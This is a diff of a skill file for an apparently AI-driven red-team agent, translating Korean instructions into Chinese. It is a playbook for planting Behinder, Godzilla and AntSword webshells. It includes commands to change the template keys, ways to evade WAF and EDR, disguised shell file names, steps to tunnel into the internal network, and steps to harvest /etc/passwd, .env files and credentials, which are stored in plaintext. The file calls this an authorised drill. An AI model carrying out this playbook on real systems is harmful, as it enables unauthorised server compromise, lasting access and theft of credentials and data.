@@ -1,88 +1,88 @@
 ---
 name: webshell-toolkit
-description: Behinder / Godzilla / AntSword 의 기동과 사용법. WebShell 업로드와 관리, 접근 유지, 대상 서버 조작에 쓴다
-whenToUse: 업로드 지점/파일 쓰기/명령 실행을 이미 확보해 WebShell 을 착지시키고 조작해야 할 때
+description: 冰蝎 / 哥斯拉 / 中国蚁剑 的启动与用法，用于上传并管理 WebShell、维持访问、操作目标服务器
+whenToUse: 已获得上传点/文件写入/命令执行，需要落地并操作 WebShell 时
 role: exploit
 enabled: true
 ---
 
-# WebShell 툴킷(준비 완료)
+# WebShell 工具包（已就位）
 
-디렉터리 `$DSH_HOME/redteam/toolkit/`, Java 25 가 설치되어 있다.
+目录 `$DSH_HOME/redteam/toolkit/`，Java 25 已安装。
 
-## 철칙: 착지는 반드시 Behinder 셸 / Godzilla 셸(암호화 셸)
+## 铁律：落地必须是冰蝎马 / 哥斯拉马（加密马）
 
-**사용자는 콘솔에서 Behinder/Godzilla 클라이언트로 이 엔트리에 직접 연결해 쓴다**. 따라서:
-- **기본적으로는 Behinder 또는 Godzilla 의 암호화 셸만 착지**시키고, `shell_type` + `pass_key` 를 DB 에 기록한다(`redteam_webshell_add`).
-- **한 줄 웹셸(`?cmd=`) / 자체 제작 셸 / 메모리 셸은 납품으로 치지 않는다**: 사용자가 연결하지 못하고 대화형 조작이 불가능하다. **임시 중계**로만 쓸 수 있고(예: 진짜 셸 전달이나 터널 구축만을 위해), note 에 "임시 중계, 납품 엔트리 아님"을 반드시 적는다.
-- Godzilla GUI 생성은 사람이 있어야 한다; **아래 "GUI 없이 Behinder 셸 생성" 방식을 우선**한다. 명령 한 줄로 납품 가능한 셸이 나온다.
+**用户要在控制台用冰蝎/哥斯拉客户端直连使用这个入口**，所以：
+- **默认只落地冰蝎马（Behinder）或哥斯拉马（Godzilla）的加密马**，并把 `shell_type` + `pass_key` 落库（`redteam_webshell_add`）。
+- **一句话马（`?cmd=`）/ 自研马 / 内存马不算交付**：用户连不上、无法交互操作。只能作为**临时中转**（例如只为投递真正的马或建隧道），且必须在 note 里写明"临时中转，非交付入口"。
+- 哥斯拉 GUI 生成需要人在场；**优先用下面「无 GUI 生成冰蝎马」的方式**，一条命令就能产出可交付的马。
 
-## GUI 없이 Behinder 셸 생성(권장, 스크립트화 가능)
+## 无 GUI 生成冰蝎马（推荐，可脚本化）
 
-Behinder 셸은 키를 템플릿에 넣는 것뿐이다: 키 = `md5(연결 비밀번호)[:16]`. 저장소에 템플릿이 있다:
+冰蝎马只是把密钥写进模板：密钥 = `md5(连接密码)[:16]`。仓库自带模板：
 `$DSH_HOME/redteam/toolkit/Behinder/server/{shell.jsp,shell.jspx,shell_java9.jsp,shell.php,shell.aspx,shell.ashx,shell.asp}`
 
 ```bash
 TK=$DSH_HOME/redteam/toolkit
-PASS='Rt@2026#xz'                       # 연결 비밀번호(무작위 생성, rebeyond 를 쓰지 않는다)
-KEY=$(printf '%s' "$PASS" | md5sum | cut -c1-16)   # Behinder 는 32자리 md5 의 앞 16자리를 요구한다
-# JSP: 템플릿의 키를 교체
+PASS='Rt@2026#xz'                       # 连接密码（随机生成，别用 rebeyond）
+KEY=$(printf '%s' "$PASS" | md5sum | cut -c1-16)   # 冰蝎要求 32 位 md5 的前 16 位
+# JSP：替换模板里的密钥
 sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.jsp > /tmp/rt-shell.jsp
-# PHP: 동일(템플릿 변수명 $key)
+# PHP：同理（模板变量名 $key）
 sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.php > /tmp/rt-shell.php
-echo "연결 비밀번호 $PASS | 키 $KEY"      # 둘 다 runs/ 와 redteam_webshell_add 에 기록한다
+echo "连接密码 $PASS ｜ 密钥 $KEY"      # 两者都要写进 runs/ 与 redteam_webshell_add
 ```
 
-- 기본 키 `e45e329feb5d925b` = `md5("rebeyond")[:16]`(템플릿의 주석이 이 뜻이다)——**반드시 자기 비밀번호로 바꾼다**. 기본 비밀번호를 쓰는 것은 셸을 방어자에게 넘기는 것과 같다.
-- 대상에 WAF/탐지가 있으면 unicode 이스케이프 변형 `shell_uni.jsp` 를 쓴다: 키도 이스케이프 형식이므로 `\\u00xx` 로 문자별 치환이 필요하다(python 으로 생성할 수 있다).
-- 실측 완료: `shell.jsp / shell.jspx / shell_java9.jsp / shell.php / shell.aspx / shell.ashx / shell.asp` 일곱 템플릿 모두 위 `sed` 한 줄로 키를 바꿀 수 있다.
+- 默认密钥 `e45e329feb5d925b` = `md5("rebeyond")[:16]`（模板里的注释就是这个意思）——**必须换成自己的密码**，用默认密码等于把马送给防守方。
+- 目标有 WAF/查杀时用 unicode 转义变体 `shell_uni.jsp`：密钥也是转义形式，需按 `\\u00xx` 逐字符替换（可用 python 生成）。
+- 已实测：`shell.jsp / shell.jspx / shell_java9.jsp / shell.php / shell.aspx / shell.ashx / shell.asp` 七个模板都能用上面这条 `sed` 一条命令换好密钥。
 
-Godzilla 셸(GUI 가 필요할 때):
+哥斯拉马（需要 GUI 时）：
 ```bash
 DISPLAY=:10.0 java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar
-# 관리 → 생성: 페이로드 java/jsp, 암호화기 Java_AES_BASE64, 비밀번호와 키 무작위 → 생성 후 업로드
+# 管理 → 生成：载荷 java/jsp、加密器 Java_AES_BASE64、密码与密钥随机 → 生成后上传
 ```
 
-## 업로드 후 반드시 "사용자가 연결할 수 있는지" 검증
-1. `curl -s -o /dev/null -w '%{http_code}' "https://target/upload/x.jsp"` → 200 이어야 한다(**GET 에 cmd 파라미터로 테스트하지 않는다**. Behinder/Godzilla 셸은 평문 명령에 응답하지 않는다).
-2. Behinder 또는 Godzilla GUI 로 새 연결(URL + 연결 비밀번호)을 만들고 "연결 테스트"를 눌러 통과해야 성공이다; 통과하면 가상 터미널로 `id/whoami` 를 실행한다.
-3. DB 기록은 빠짐없이: `url`, `shell_type=behinder|godzilla`, `pass_key=연결 비밀번호`, `privilege`, `secret_ref`(증거 파일); 이어서 **즉시 suo5 터널을 만든다**(스킬 `suo5-tunnel`).
+## 上传后必须验证"用户能连上"
+1. `curl -s -o /dev/null -w '%{http_code}' "https://target/upload/x.jsp"` → 预期 200（**不要用 GET 带 cmd 参数去测**，冰蝎/哥斯拉马不响应明文命令）。
+2. 用冰蝎或哥斯拉 GUI 新建连接（URL + 连接密码）点「测试连接」→ 通了才算成功；通了再用虚拟终端执行 `id/whoami`。
+3. 落库必须写全：`url`、`shell_type=behinder|godzilla`、`pass_key=连接密码`、`privilege`、`secret_ref`（证据文件）；随后**立刻建 suo5 隧道**（技能 `suo5-tunnel`）。
 
-## 도구 일람
+## 工具一览
 
-| 도구 | 기동 명령 | 설명 |
+| 工具 | 启动命令 | 说明 |
 |---|---|---|
-| Behinder v4.1 | `java -jar $DSH_HOME/redteam/toolkit/Behinder/Behinder.jar` | AES 암호화 트래픽, JSP/PHP/ASPX |
-| Godzilla v4.0.1 | `java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar` | JSP/PHP/ASPX 전체 암호화 payload 지원 |
-| AntSword | `$DSH_HOME/redteam/toolkit/AntSword/AntSword-Loader-v4.0.3-linux-x64/AntSword` | 첫 기동 시 소스 디렉터리 `antSword-2.1.16` 선택 |
-| suo5 터널 | `./suo5-linux-amd64` | 스킬 `suo5-tunnel` 참조 |
+| 冰蝎 Behinder v4.1 | `java -jar $DSH_HOME/redteam/toolkit/Behinder/Behinder.jar` | AES 加密流量，JSP/PHP/ASPX |
+| 哥斯拉 Godzilla v4.0.1 | `java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar` | 支持 JSP/PHP/ASPX 全加密 payload |
+| 中国蚁剑 AntSword | `$DSH_HOME/redteam/toolkit/AntSword/AntSword-Loader-v4.0.3-linux-x64/AntSword` | 首次启动选择源码目录 `antSword-2.1.16` |
+| suo5 隧道 | `./suo5-linux-amd64` | 见技能 `suo5-tunnel` |
 
-## 전형적 흐름(승인된 드릴)
-1. **쓰기 지점 확정**: 업로드 취약점 / 임의 파일 쓰기 / 관리자 플러그인 업로드 / 템플릿 쓰기 / 데이터베이스 파일 쓰기(`INTO OUTFILE`).
-2. **payload 생성**: 대상 언어에 따라 JSP/JSPX/PHP/ASPX 선택(위 "GUI 없이 Behinder 셸 생성" 참조), 비밀번호는 무작위 생성 후 `runs/` 에 기록.
-3. **업로드와 접근**: `curl -s "https://target.example.com/upload/x.jsp"` 로 200 응답 확인; 셸을 눈에 띄는 경로(예: `/shell.jsp`)에 두지 않고 정적 리소스와 같은 스타일의 무작위 파일명을 쓴다.
-4. **연결 관리**: 도구에 URL + 비밀번호를 추가하고 연결을 테스트한다; 성공하면 "가상 터미널"로 명령을 실행한다.
-5. **유지와 활용**:
-   - `id/whoami/hostname/uname -a`, 시스템 계정, 내부 IP, 라우팅을 수집한다.
-   - **즉시 suo5 로 터널을 열어 내부망으로 진입**(스킬 `suo5-tunnel`, 내부망 돌파의 표준 통로다).
-   - 민감 파일 수집: `/etc/passwd`, 설정, `.env`, 소스, 데이터베이스 연결 문자열 → `runs/` 에 저장.
-6. **DB 기록**:
-   - `redteam_webshell_add`(url / **shell_type** / **pass_key** / privilege / secret_ref)
-   - `redteam_access_add`(host/계정/방식 webshell/권한/세션 참조)
-   - `redteam_vuln_update` 로 진입 취약점을 `exploited` 로 설정
-   - `redteam_http_evidence_add` 로 업로드 요청과 셸 접근 요청 저장
-   - `redteam_chain_add`(stage=exploit/access)
+## 典型流程（授权演练）
+1. **确定写入点**：上传漏洞 / 任意文件写 / 后台插件上传 / 模板写入 / 数据库写文件（`INTO OUTFILE`）。
+2. **生成 payload**：按目标语言选 JSP/JSPX/PHP/ASPX（见上「无 GUI 生成冰蝎马」），密码随机生成并记到 `runs/`。
+3. **上传并访问**：`curl -s "https://target.example.com/upload/x.jsp"` 确认返回 200；不要把 shell 放在显眼路径（如 `/shell.jsp`），用与静态资源同风格的随机文件名。
+4. **连接管理**：在工具里新增 URL + 密码，测试连接；成功后用「虚拟终端」执行命令。
+5. **维持与利用**：
+   - 收集 `id/whoami/hostname/uname -a`、系统账号、内网 IP、路由。
+   - **立刻用 suo5 起隧道进内网**（技能 `suo5-tunnel`，这是内网突破的标准通道）。
+   - 抓取敏感文件：`/etc/passwd`、配置、`.env`、源码、数据库连接串 → 存 `runs/`。
+6. **落库**：
+   - `redteam_webshell_add`（url / **shell_type** / **pass_key** / privilege / secret_ref）
+   - `redteam_access_add`（host/账号/方式 webshell/权限/会话引用）
+   - `redteam_vuln_update` 把入口漏洞置为 `exploited`
+   - `redteam_http_evidence_add` 保存上传请求与 shell 访问请求
+   - `redteam_chain_add`（stage=exploit/access）
 
-## 명령 실행(임시 중계일 때만 사용)
-한 번짜리 명령 실행만 필요하면 이미 있는 RCE 나 터널을 직접 쓰는 편이 낫다. 한 줄 웹셸을 착지시킬 필요는 없다:
+## 命令执行（临时中转时才用）
+如果只需要一次性命令执行，优先直接用已有 RCE 或隧道，不必落一句话马：
 ```bash
-# 예: 임시 한 줄 웹셸로 파라미터 전달 실행(사용 후 삭제, 납품 엔트리 아님)
+# 例：通过临时一句话马传参执行（用后即删，不算交付入口）
 curl -s "https://target.example.com/upload/x.jsp?cmd=id"
-# Behinder/Godzilla 는 GUI 도구이므로, 명령행에서는 suo5 터널 + 일반 도구가 더 간편하다
+# 冰蝎/哥斯拉是 GUI 工具，命令行下用 suo5 隧道 + 常规工具更省事
 ```
 
-## 주의 사항
-- 생성한 셸은 **이번 승인 드릴의 대상**에만 업로드한다; 사용 후 필요에 따라 정리한다(파일 삭제, 원상 복구).
-- 도구 GUI 는 그래픽 세션이 필요하다(`DISPLAY=:10.0` 사용 가능).
-- 자격 증명은 `redteam_credential_add` 로 DB 에 기록한다: **평문을 `secret_value` 에 기록**(패널에 그대로 표시되어 재사용하기 좋다), 동시에 증거 파일을 `runs/` 에 쓰고 `secret_ref` 에 참조한다. 자산 DB 는 로컬에만 있으며, DB 나 내보낸 내용을 밖으로 가져가지 않는다.
-- 대상에 EDR/탐지가 있을 수 있다: 먼저 셸이 살아 있는지 테스트해 반복 착지로 경보를 유발하지 않는다; 착지가 실패하면 언어/인코딩(JSP→JSPX→PHP)을 바꾸거나 업로드 지점을 바꾼다.
+## 注意事项
+- 生成的 shell 只能上传到**本次授权演练的目标**；用完按需清理（删除文件、恢复原状）。
+- 工具 GUI 需要图形会话（`DISPLAY=:10.0` 可用）。
+- 凭据用 `redteam_credential_add` 落库：**明文写 `secret_value`**（面板直接显示，便于复用），同时把证据文件写 `runs/` 并在 `secret_ref` 里引用。资产库只在本机，别把库或导出内容带走。
+- 目标可能有 EDR/查杀：先测试 shell 是否存活，避免反复落地触发告警；落地失败就换语言/编码（JSP→JSPX→PHP）或换上传点。
